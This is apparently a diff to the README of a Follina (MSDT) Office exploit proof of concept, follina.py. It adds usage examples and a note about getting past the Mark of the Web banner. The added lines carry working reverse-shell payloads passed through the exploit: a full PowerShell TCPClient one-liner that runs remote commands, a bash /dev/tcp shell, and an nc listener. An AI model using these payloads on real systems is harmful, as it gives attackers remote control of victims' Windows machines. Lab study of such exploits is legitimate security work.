@@ -5,12 +5,13 @@
 - Fixed Options error in TCP Server log
 - Added Copy of doc file to Http Server for directly download payload
 - Added some Text to doc file for "maybe easy" bypassing Mark of the Web info banner
+- Added new native PS Reverse Shell via `--reverse 5555` Parameter for bypassing nc problems
 - Some extra stuff in codebase
 
 
 ## Run Script
 
-- Download Win10_21H2_English_x32.iso (Build 19044.1288)
+- Download [Win10_21H2_English_x32.iso (Build 19044.1288)](https://archive.org/download/Win10_21H2_English_x32/Win10_21H2_English_x32.iso)
 - Install/Run on Virtualbox or other VM
 - Download Office 32bit (ODT not working for me at this point)
 - `bitsadmin /TRANSFER O13DL /DOWNLOAD /PRIORITY high https://ia803209.us.archive.org/29/items/microsoft-office-2013-pro-plus-sp-1-english-32-bit_202005/Microsoft-Office-2013-Pro-Plus-SP1-English-32Bit.zip C:\office32.zip`
@@ -22,15 +23,30 @@
 # Calc only
 python3 follina.py -i eth0 -p 8008
 ```
+---
 
 ```bash
 # Multiple programs and MsgBox
 python3 follina.py -i enp0s3 -p 8008 -c 'calc ; winver ; Add-Type -AssemblyName "System.Windows.Forms"; [System.Windows.Forms.MessageBox]::Show("This is Follina PoC Edit by suuhm 2025", "Follina PoC", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning, [System.Windows.Forms.MessageBoxDefaultButton]::Button1, [System.Windows.Forms.MessageBoxOptions]::DefaultDesktopOnly) ; notepad'
 ```
 
+## Reverse Shells
+
 ```bash
-# Reverse LOLBIN shell
-nc -lnvp 5555
+# New Alter-Native Reverse shell
+python3 follina.py -i enp0s3 -p 8008 -r 5555
+```
+
+--- 
+
+```bash
+ip a; nc -lnvp <WISHED_PORT> 
+
+# Using native Reverse LOLBIN shell
+python3 follina.py -i enp0s3 -p 8008 -c '$c=New-Object System.Net.Sockets.TCPClient("<REMOTE_IP_HOSTNAME>",<WISHED_PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex ". { $d } 2>&1"|Out-String)+"PS "+(pwd).Path+"> ";$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
+
+
+# For mysys/cygwin systems etc...
 python3 follina.py -i enp0s3 -p 8008 -c "export RHOST=<RHOST_IP>;export RPORT=5555;bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"
 ```
 
